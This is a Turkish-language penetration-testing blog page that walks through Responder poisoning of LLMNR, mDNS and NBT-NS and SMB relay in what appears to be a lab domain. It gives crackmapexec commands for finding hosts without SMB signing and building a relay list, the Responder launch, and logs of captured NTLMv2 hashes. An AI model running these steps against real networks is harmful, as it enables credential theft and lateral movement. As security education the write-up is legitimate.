<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" 
  
    data-mode="dark"
  
>
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="responder &amp; ntlmrelay" />
<meta name="author" content="yugen" />
<meta property="og:locale" content="en" />
<meta name="description" content="Temelde mDNS yapısının istismarı ile gelişir. Client bir paylaşıma erişmek için mDNS kullanılır. Çünkü client tarafında DNS ayarları yapılandırılmamıştır ve yerel ağda da bu işi üstlenecek bir DNS Server yapılandırılmamıştır. Hal böyle iken mDNS bu görevi üstlenir ve hub gibi tüm networke paylaşım adı olarak girilen verinin kimde olduğunu gönderir. Saldırgan bu trafiğe yanıt verir ve kurban credential girer. Girilen credsin NTLMv2 hali saldırgana iletilir. Bu hash bruteforce ile kırılabilir veya yerel ağda SMB relay yapılabilir. Sonucunda kullanıcı hashleri elde edilir ve networkte lateral movement gerçekleştirilir. Ancak buradaki önemli nokta, ntlmv2 hashin elde edildiği orijinal hedefe aynı hash ile saldırının gerçekleştirilmemesi. Çünkü istemci hangi challange yolladığını ve beklediği challange değerini saklamaktadır. İletilen challange değeri responder tarafından ayarlanabilir veya random bırakılabilir. Ancak bunu tutturmak yürüyerek aya gitmekten daha zordur. Dolayısı ile bir hedeften gelen hash verisini o hedef hariç tüm smb signing false olarak konfigüre edilen hedeflere relaylemek en mantıklısıdır. 1 2 1337@empire:~$ crackmapexec smb 192.168.1.50 SMB 192.168.1.50 445 WIN-507CQFD84EB [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False) Domain Controller makinesinde signing:True olarak ayarlanmış." />
<meta property="og:description" content="Temelde mDNS yapısının istismarı ile gelişir. Client bir paylaşıma erişmek için mDNS kullanılır. Çünkü client tarafında DNS ayarları yapılandırılmamıştır ve yerel ağda da bu işi üstlenecek bir DNS Server yapılandırılmamıştır. Hal böyle iken mDNS bu görevi üstlenir ve hub gibi tüm networke paylaşım adı olarak girilen verinin kimde olduğunu gönderir. Saldırgan bu trafiğe yanıt verir ve kurban credential girer. Girilen credsin NTLMv2 hali saldırgana iletilir. Bu hash bruteforce ile kırılabilir veya yerel ağda SMB relay yapılabilir. Sonucunda kullanıcı hashleri elde edilir ve networkte lateral movement gerçekleştirilir. Ancak buradaki önemli nokta, ntlmv2 hashin elde edildiği orijinal hedefe aynı hash ile saldırının gerçekleştirilmemesi. Çünkü istemci hangi challange yolladığını ve beklediği challange değerini saklamaktadır. İletilen challange değeri responder tarafından ayarlanabilir veya random bırakılabilir. Ancak bunu tutturmak yürüyerek aya gitmekten daha zordur. Dolayısı ile bir hedeften gelen hash verisini o hedef hariç tüm smb signing false olarak konfigüre edilen hedeflere relaylemek en mantıklısıdır. 1 2 1337@empire:~$ crackmapexec smb 192.168.1.50 SMB 192.168.1.50 445 WIN-507CQFD84EB [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False) Domain Controller makinesinde signing:True olarak ayarlanmış." />
<link rel="canonical" href="http://192.168.1.40:4000/posts/responder-ve-ntlmrelay/" />
<meta property="og:url" content="http://192.168.1.40:4000/posts/responder-ve-ntlmrelay/" />
<meta property="og:site_name" content="Yugen" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-10T00:00:00+03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="responder &amp; ntlmrelay" />
<meta name="twitter:site" content="@empire_exec" />
<meta name="twitter:creator" content="@empire_exec" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"yugen","url":"https://github.com/x67sv/"},"dateModified":"2023-07-10T00:00:00+03:00","datePublished":"2023-07-10T00:00:00+03:00","description":"Temelde mDNS yapısının istismarı ile gelişir. Client bir paylaşıma erişmek için mDNS kullanılır. Çünkü client tarafında DNS ayarları yapılandırılmamıştır ve yerel ağda da bu işi üstlenecek bir DNS Server yapılandırılmamıştır. Hal böyle iken mDNS bu görevi üstlenir ve hub gibi tüm networke paylaşım adı olarak girilen verinin kimde olduğunu gönderir. Saldırgan bu trafiğe yanıt verir ve kurban credential girer. Girilen credsin NTLMv2 hali saldırgana iletilir. Bu hash bruteforce ile kırılabilir veya yerel ağda SMB relay yapılabilir. Sonucunda kullanıcı hashleri elde edilir ve networkte lateral movement gerçekleştirilir. Ancak buradaki önemli nokta, ntlmv2 hashin elde edildiği orijinal hedefe aynı hash ile saldırının gerçekleştirilmemesi. Çünkü istemci hangi challange yolladığını ve beklediği challange değerini saklamaktadır. İletilen challange değeri responder tarafından ayarlanabilir veya random bırakılabilir. Ancak bunu tutturmak yürüyerek aya gitmekten daha zordur. Dolayısı ile bir hedeften gelen hash verisini o hedef hariç tüm smb signing false olarak konfigüre edilen hedeflere relaylemek en mantıklısıdır. 1 2 1337@empire:~$ crackmapexec smb 192.168.1.50 SMB 192.168.1.50 445 WIN-507CQFD84EB [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False) Domain Controller makinesinde signing:True olarak ayarlanmış.","headline":"responder &amp; ntlmrelay","mainEntityOfPage":{"@type":"WebPage","@id":"http://192.168.1.40:4000/posts/responder-ve-ntlmrelay/"},"url":"http://192.168.1.40:4000/posts/responder-ve-ntlmrelay/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>responder & ntlmrelay | Yugen
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Yugen">
<meta name="application-name" content="Yugen">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/pp.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <div class="site-title">
      <a href="/">Yugen</a>
    </div>
    <div class="site-subtitle fst-italic">CTF player, R3V/D3V, Penetration Tester</div>
  </div>
  <!-- .profile-wrapper -->

  <ul class="nav flex-column flex-grow-1 w-100 ps-0">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
      <li class="nav-item">
        <a href="/categories/" class="nav-link">
          <i class="fa-fw fas fa-stream"></i>
          

          <span>CATEGORIES</span>
        </a>
      </li>
      <!-- .nav-item -->
    
      <li class="nav-item">
        <a href="/tags/" class="nav-link">
          <i class="fa-fw fas fa-tags"></i>
          

          <span>TAGS</span>
        </a>
      </li>
      <!-- .nav-item -->
    
      <li class="nav-item">
        <a href="/archives/" class="nav-link">
          <i class="fa-fw fas fa-archive"></i>
          

          <span>ARCHIVES</span>
        </a>
      </li>
      <!-- .nav-item -->
    
      <li class="nav-item">
        <a href="/about/" class="nav-link">
          <i class="fa-fw fas fa-info-circle"></i>
          

          <span>ABOUT</span>
        </a>
      </li>
      <!-- .nav-item -->
    
  </ul>
  <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/x67sv"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://twitter.com/empire_exec"
          aria-label="twitter"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
    
  </div>
  <!-- .sidebar-bottom -->
</div>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container px-xxl-5">
        <!-- The Top Bar -->

<div id="topbar-wrapper">
  <div
    id="topbar"
    class="container d-flex align-items-center justify-content-between h-100"
  >
    <span id="breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>responder & ntlmrelay</span>
            

          
        
      
    </span>
    <!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </span>
    <span id="search-cancel">Cancel</span>
  </div>
</div>

        











<div class="row">
  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4">
    

    <div class="post px-1 px-md-2">
      

      
        
      
        <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->



  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
        <!-- add SVG placehoder -->
        
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
        <!-- add SVG placehoder -->
        
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  
    

    
    

    

    
    

    
    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    

    

    

    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
    
    

    <!-- add image placeholder -->
    
      
        <!-- add SVG placehoder -->
        
      
    

    <!-- Bypass the HTML-proofer test -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        
      
    

    <!-- combine -->
    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- return -->




<h1 data-toc-skip>responder & ntlmrelay</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em
  class=""
  data-ts="1688936400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jul 10, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        
          <a href="https://github.com/x67sv/">yugen</a>
          
        
      
      </em>
    </span>

    <div>
      <!-- read time -->
      <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4485 words"
>
  <em>24 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Temelde mDNS yapısının istismarı ile gelişir. Client bir paylaşıma erişmek için <code class="language-plaintext highlighter-rouge">mDNS</code> kullanılır. Çünkü client tarafında <code class="language-plaintext highlighter-rouge">DNS</code> ayarları yapılandırılmamıştır ve yerel ağda da bu işi üstlenecek bir DNS Server yapılandırılmamıştır. Hal böyle iken mDNS bu görevi üstlenir ve hub gibi tüm networke paylaşım adı olarak girilen verinin kimde olduğunu gönderir. Saldırgan bu trafiğe yanıt verir ve kurban credential girer. Girilen credsin <code class="language-plaintext highlighter-rouge">NTLMv2</code> hali saldırgana iletilir. Bu hash bruteforce ile kırılabilir veya yerel ağda <code class="language-plaintext highlighter-rouge">SMB relay</code> yapılabilir. Sonucunda kullanıcı hashleri elde edilir ve networkte <code class="language-plaintext highlighter-rouge">lateral movement</code> gerçekleştirilir. Ancak buradaki önemli nokta, <code class="language-plaintext highlighter-rouge">ntlmv2</code> hashin elde edildiği orijinal hedefe aynı hash ile saldırının gerçekleştirilmemesi. Çünkü istemci hangi challange yolladığını ve beklediği challange değerini saklamaktadır. İletilen challange değeri responder tarafından ayarlanabilir veya random bırakılabilir. <code class="language-plaintext highlighter-rouge">Ancak bunu tutturmak yürüyerek aya gitmekten daha zordur.</code> Dolayısı ile bir hedeften gelen hash verisini o hedef hariç tüm <code class="language-plaintext highlighter-rouge">smb signing false</code> olarak konfigüre edilen hedeflere relaylemek en mantıklısıdır.</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>crackmapexec smb 192.168.1.50                  
<span class="go">SMB         192.168.1.50    445    WIN-507CQFD84EB  [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False)
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Domain Controller makinesinde signing:True olarak ayarlanmış.</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>crackmapexec smb 192.168.1.27
<span class="go">SMB         192.168.1.27    445    CLIENT           [*] Windows 10.0 Build 22621 x64 (name:CLIENT) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)
</span></pre></td></tr></tbody></table></code></div></div>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>crackmapexec smb 192.168.1.37
<span class="go">SMB         192.168.1.37    445    DESKTOP-3QJSCMN  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-3QJSCMN) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Domaine bağlı iki cihazda default olarak signing: False olarak ayarlanmış.</p>
</blockquote>

<blockquote class="prompt-info">
  <p>192.168.1.50 olan offensive.local e relay yapamazsın. Ancak 192.168.1.27 ve 192.168.1.37 olan clientlara smb relay yapabilirsin.</p>
</blockquote>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span>crackmapexec smb 192.168.1.0/24 <span class="nt">--gen-relay-list</span> relaylist
<span class="go">SMB         192.168.1.27    445    CLIENT2          [*] Windows 10.0 Build 22621 x64 (name:CLIENT2) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)
SMB         192.168.1.50    445    WIN-507CQFD84EB  [*] Windows 10.0 Build 17763 x64 (name:WIN-507CQFD84EB) (domain:OFFENSIVE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.1.37    445    DESKTOP-3QJSCMN  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-3QJSCMN) (domain:OFFENSIVE.LOCAL) (signing:False) (SMBv1:False)
</span></pre></td></tr></tbody></table></code></div></div>
<blockquote>
  <p>Relay listesi oluşturulur</p>
</blockquote>

<p>Responder aktif edilir</p>
<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
</pre></td><td class="rouge-code"><pre><span class="gp">1337@empire:~$</span><span class="w"> </span><span class="nb">sudo </span>responder <span class="nt">-I</span> eth0 <span class="nt">-dvFw</span>
<span class="go">[sudo] password for 1337: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0

  To support this project:
</span><span class="gp">  Patreon -&gt;</span><span class="w"> </span>https://www.patreon.com/PythonResponder
<span class="gp">  Paypal  -&gt;</span><span class="w"> </span>https://paypal.me/PythonResponder
<span class="go">
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.19]
    Responder IPv6             [fe80::5acb:1933:215e:479f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-8GIZN6073G7]
    Responder Domain Name      [DNSB.LOCAL]
    Responder DCE-RPC Port     [49552]

[+] Listening for events...                                                                                                                                                                                                                 

[*] [DHCP] Found DHCP server IP: 192.168.1.1, now waiting for incoming requests...
</span></pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/10.png" class="popup img-link dark w-40 shadow rounded-10 shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1212 668'%3E%3C/svg%3E" data-src="/assets/10.png" alt="dark mode only"  width="1212" height="668" class="lazyload" data-proofer-ignore></a></p>
<blockquote>
  <p>Client tarafından bir paylaşım aratılır. Bu elle de yapılabilir, arka planda explorer.exe bunu düzenli olarak ta gerçekleştirebilir.</p>
</blockquote>

<div class="language-console highlighter-rouge"><div class="code-header">
        <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
</pre></td><td class="rouge-code"><pre><span class="go">[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\dumbass
[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:df5a62f91b26fed7:5A855615494E14CC85B0159814B11387:0101000000000000002A978EEEB3D9015B2C3B23DDC3F6C80000000002000800500050005800540001001E00570049004E002D0032003100350042004C005000540053001231239004E002D0032003100350042004C00500054005300340042012312380054002E004C004F00430041004C1231230050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C0007000800002A978EEEB3D925621412312330003000000123123200000F2B72D7754D1AB61BA316B16DE6792123123803B27053812312300000000000900220063006900660073002F006200650064006100760061005F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\dumbass
[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:fe0af26e72dd6dbc:A4214942607CFCE9544BB4DCCB7E4DDF:0101000000000000002A978EEEB3D9011C2FA526709975BA00000000020008005000512312340001001E00570049004E002D0032003100350042004C005000540053003400420012312303400570012312300540053003400420051002E0050005000580054002E004C004F00430041004C000300140050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C0007000800002A978EEEB3D90106000412312305F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\dumbass
[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:7bbc33071a7c08c7:78121690657EC2FF1A792082B06AB062:0101000000000000002A978EEEB3D901F1DCE5152BD8F101231230002000800500050005800540001001E00570049004E002D0032003100350042004C0050005400530034004200510004003400570049004E002D0032012312305000540053003400420051002E0050005000580054002E0012312300000000000000000200000F2B72D7754D1AB61BA316B16DE6792EAD59F2D71231236CCE5D80A001000000000000000000000000000000000000900220063006900660073002F006200650064006100760061005F00790065006D0065006B000000000000000000                                                                                                                                                                                                                       
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\dumbass
[SMB] NTLMv2-SSP Hash     : dumbass::OFFENSIVE:8ba3107eb7b03112:F7835BEACEB9142045F271EBECC212312340053003400420051002E0050005000580054002E004C004F00430041004C000300140050005000580054002E004C004F00430041004C000500140050005000580054002E004C004F00430041004C00070008012621E12312300040002000000080030003000000000000000000000000123123006B000000000000000000                                                                                                                                                                                                                       
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to 192.168.1.27    for name bedava_yemek.local
[*] [MDNS] Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek.local
[*] [LLMNR]  Poisoned answer sent to fe80::8874:4302:b3cf:601f for name bedava_yemek
[*] [LLMNR]  Poisoned answer sent to 192.168.1.27 for name bedava_yemek
[SMB] NTLMv2-SSP Client   : fe80::8874:4302:b3cf:601f
[SMB] NTLMv2-SSP Username : OFFENSIVE\dumbass
